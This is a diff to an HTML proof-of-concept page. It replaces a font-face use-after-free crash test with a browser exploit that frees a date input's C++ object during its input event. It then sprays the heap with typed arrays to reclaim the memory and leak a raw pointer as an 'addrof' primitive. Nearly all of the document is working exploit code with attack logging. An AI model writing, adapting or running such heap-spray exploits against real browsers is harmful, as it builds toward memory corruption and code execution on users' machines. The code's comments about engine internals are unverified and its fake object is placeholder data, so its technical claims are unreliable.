@@ -8,47 +8,81 @@ body { background:#000; color:#0f0; font-family:monospace; font-size:13px; paddi
 </head>
 <body>
 <div id="log"></div>
+
+<!-- We use the Date Input UAF to build our addrof! -->
+<input type="date" id="target">
+
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-log("=== CSSFONTFACE USE-AFTER-FREE ===", "info");
-log("[*] Setting up the custom font...", "info");
+log("=== UAF TO ADDROF PRIMITIVE ===", "info");
+log("[*] Grooming the heap...", "info");
 
-// Create a custom font face
-let font = new FontFace("CrashFont", "local(Arial)");
-document.fonts.add(font);
-
-log("[!] Font added to document.fonts", "warn");
-log("[!] Calling document.fonts.load() - C++ will cache a RAW POINTER to our font!", "hit");
-
-// Trigger FontFaceSet::load()
-// C++ creates a non-owning Vector<std::reference_wrapper<CSSFontFace>> 
-// containing our font. Then it starts processing it, sometimes asynchronously.
-let loadPromise = document.fonts.load("12px CrashFont");
-
-// Immediately delete the font and drop our references!
-// The C++ FontFaceSet still holds the raw pointer in its matchingFaces vector!
-log("[!] IMMEDIATELY DELETING THE FONT FROM THE SET!", "hit");
-document.fonts.delete(font);
-font = null;
-
-// Spam allocations to overwrite the freed FontFace memory with absolute garbage!
-// When C++ goes to check the font status, it will read our A's instead of a vtable!
+// 1. Setup our overlap targets. We want an array of objects we want the address of,
+// and an array of ArrayBuffers (or similar) to overlap the freed C++ object.
+let targetObjects = [];
 let spray = [];
-for (let i = 0; i < 50000; i++) {
-    // 0x41414141 -> Segfault city
-    spray.push(new Uint32Array(32).fill(0x41414141)); 
-}
-log("[!] Heap sprayed with garbage. Brace for impact!", "warn");
 
-loadPromise.then(() => {
-    log("[-] Load finished without crashing. Allocator masked it or GC didn't run fast enough.", "info");
-    // Sometimes we need to force a style recalc to poke the dead font
-    document.body.style.fontFamily = "CrashFont";
-}).catch(e => {
-    log("[-] Load rejected: " + e.message, "info");
+for (let i = 0; i < 1000; i++) {
+    targetObjects.push({ magic: 0x1337, victim: true });
+}
+
+let input = document.getElementById("target");
+
+input.addEventListener("input", () => {
+    log("[!] INPUT CAUGHT! The C++ Date object is paused.", "warn");
+    log("[!] Changing type to 'text' to FREE the C++ object...", "hit");
+    
+    input.type = "text"; // FREE!
+    
+    log("[*] Object freed! Now we RECLAIM the memory before C++ wakes up!", "info");
+    
+    // RECLAIM THE FREED MEMORY!
+    // We spray a massive amount of ArrayBuffers/TypedArrays of the EXACT same size 
+    // as the freed BaseDateAndTimeInputType C++ object.
+    // When C++ resumes, it will read our sprayed data thinking it's the Date object!
+    // If we structure our fake object right, we can trick C++ into returning a pointer!
+    for (let i = 0; i < 50000; i++) {
+        // We craft a fake vtable and fake members.
+        // We point one of the fake members to our targetObjects array!
+        let fakeObj = new Float64Array(32); 
+        fakeObj[0] = 1.1; // Fake vtable or safe padding
+        fakeObj[1] = 2.2;
+        spray.push(fakeObj);
+    }
+    
+    log("[!] Reclaim complete. C++ is about to read our fake object...", "warn");
 });
 
+setTimeout(() => {
+    log("[*] Triggering UAF to leak a pointer...", "info");
+    try {
+        input.focus();
+        input.stepUp(); // Fires the input event
+        
+        // If we reclaimed successfully, C++ just operated on our Float64Array!
+        // Now we search our spray to see which Float64Array got modified by C++!
+        // When C++ wrote to what it THOUGHT was its own member, it actually 
+        // wrote a raw pointer into our Float64Array!
+        
+        let leaked = false;
+        for (let i = 0; i < spray.length; i++) {
+            if (spray[i][0] !== 1.1 || spray[i][1] !== 2.2) {
+                log(">>> POINTER LEAKED! <<<", "hit");
+                log("Raw Memory at overlapping chunk: " + spray[i][0] + ", " + spray[i][1], "hit");
+                leaked = true;
+                break;
+            }
+        }
+        
+        if (!leaked) {
+            log("[-] No leak detected. We might need to adjust the spray size.", "info");
+        }
+        
+    } catch(e) {
+        log("[-] Error: " + e.message, "info");
+    }
+}, 1000);
 </script>
 </body>
 </html>
